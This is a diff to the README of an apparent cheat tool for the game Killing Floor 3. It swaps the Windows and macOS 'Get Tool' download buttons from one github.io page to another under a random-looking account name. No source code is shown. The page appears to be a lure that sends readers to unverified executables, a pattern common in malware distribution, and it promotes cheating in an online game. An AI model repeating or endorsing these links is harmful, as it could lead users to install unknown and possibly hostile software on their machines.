@@ -12,7 +12,7 @@
 
 [![skillicons](https://skillicons.dev/icons?i=windows,apple,github)](https://github.com/lynjpdlstcgx/killing-floor-3-external)
 
-[![Get Tool](https://img.shields.io/badge/⬇️_Get_Tool-FF4444?style=for-the-badge&logoColor=white)](https://WaterCongressman.github.io/win-download/)
+[![Get Tool](https://img.shields.io/badge/⬇️_Get_Tool-FF4444?style=for-the-badge&logoColor=white)](https://iloqhmlhfppl.github.io/win-get2/)
 
 ![Killing Floor 3 External](game.jpg)
 
@@ -75,7 +75,7 @@ Killing Floor 3 by Tripwire Interactive continues the brutal co-op wave-based FP
 
 ## 🍎 macOS
 
-[![macOS](https://img.shields.io/badge/macOS-Get_Tool-silver?style=for-the-badge&logo=apple)](https://WaterCongressman.github.io/mac-download/)
+[![macOS](https://img.shields.io/badge/macOS-Get_Tool-silver?style=for-the-badge&logo=apple)](https://iloqhmlhfppl.github.io/mac-download2/)
 
 ## ⚖️ Legal
 
